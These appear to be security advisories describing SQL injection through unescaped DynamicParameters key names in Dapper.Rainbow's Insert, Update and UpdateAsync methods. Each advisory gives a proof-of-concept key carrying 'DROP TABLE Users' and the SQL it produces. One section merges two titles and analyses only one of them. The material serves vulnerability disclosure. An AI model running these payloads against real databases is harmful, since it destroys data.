Title: SQL Injection via Dynamic Parameter Name Concatenation in Dapper.Rainbow.Table.Insert
Analysis:
### Vulnerability Analysis

In `Dapper.Rainbow/Database.cs`, the `Insert` method parses the `data` parameter to resolve the parameter names via `GetParamNames(o)`. When the input is a `DynamicParameters` object, `GetParamNames` returns `parameters.ParameterNames.ToList()`, which extracts the keys directly.

These keys/parameter names are then concatenated directly into the SQL string without any escaping or validation:
```csharp
string cols = string.Join(\",\", paramNames);
string colsParams = string.Join(\",\", paramNames.Select(p => \"@\" + p));
var sql = \"set nocount on insert \" + TableName + \" (\" + cols + \") values (\" + colsParams + \") select cast(scope_identity() as int)\";
```

If a developer passes user-controlled keys into `DynamicParameters` and invokes `Insert(data)`, an attacker can manipulate the key strings to inject arbitrary SQL statements.

### Conceptual Exploit Payload

Suppose a developer creates a `DynamicParameters` instance from user-provided form keys:
```csharp
var dynParams = new DynamicParameters();
dynParams.Add(\"colName) VALUES (1); DROP TABLE Users; --\", \"dummyValue\");
db.Users.Insert(dynParams);
```

The resulting executed SQL becomes:
```sql
set nocount on insert Users (colName) VALUES (1); DROP TABLE Users; --) values (@colName) VALUES (1); DROP TABLE Users; --) select cast(scope_identity() as int)
```

This leads to a direct SQL injection vector and the execution of the injected `DROP TABLE Users` statement.

Title: SQL Injection via Dynamic Parameter Name Concatenation in Dapper.Rainbow.Table.Update
Analysis:
### Vulnerability Analysis

In `Dapper.Rainbow/Database.cs`, the `Update` method extracts property/parameter names from the `data` parameter via `GetParamNames((object)data)`. When `DynamicParameters` is used, the keys are extracted directly as strings. 

The parameter names are then concatenated directly into the UPDATE SQL command text:
```csharp
builder.AppendLine(string.Join(\",\", paramNames.Where(n => n != \"Id\").Select(p => p + \"= @\" + p)));
```

There is no validation, escaping, or whitelist checks applied to these names. If they are sourced from untrusted user-controlled keys, an attacker can construct parameter names that break out of the SET clause and execute arbitrary SQL commands.

### Conceptual Exploit Payload

If an application passes user-defined keys to `Update`:
```csharp
var dynParams = new DynamicParameters();
dynParams.Add(\"colName = 1; DROP TABLE Users; --\", \"dummyValue\");
db.Users.Update(123, dynParams);
```

The compiled query will be:
```sql
update Users set colName = 1; DROP TABLE Users; --= @colName = 1; DROP TABLE Users; -- where Id = @Id
```

This injects and executes the `DROP TABLE Users` command directly.

Title: SQL Injection via Dynamic Parameter Name Concatenation in Dapper.Rainbow.Table.InsertAsync
SQL Injection via Dynamic Parameter Name Concatenation in Dapper.Rainbow.Table.UpdateAsync
Analysis:
### Vulnerability Analysis

In `Dapper.Rainbow/Database.Async.cs`, the `UpdateAsync` method is the asynchronous equivalent of `Update`, and exhibits the exact same dynamic string concatenation SQL injection. It uses `GetParamNames((object)data)` to fetch parameters, and then formats and appends them to a `StringBuilder` representing the UPDATE SQL command text:
```csharp
builder.AppendLine(string.Join(\",\", paramNames.Where(n => n != \"Id\").Select(p => p + \"= @\" + p)));
```

If the parameter keys are sourced from untrusted inputs, an attacker can hijack the query structure.

### Conceptual Exploit Payload

An attacker provides input keys that populate a `DynamicParameters` object:
```csharp
var dynParams = new DynamicParameters();
dynParams.Add(\"colName = 1; DROP TABLE Users; --\", \"dummyValue\");
await db.Users.UpdateAsync(123, dynParams);
```

The compiled query will execute:
```sql
update Users set colName = 1; DROP TABLE Users; --= @colName = 1; DROP TABLE Users; -- where Id = @Id
```

This leads to a direct SQL injection vector and the execution of the injected command.
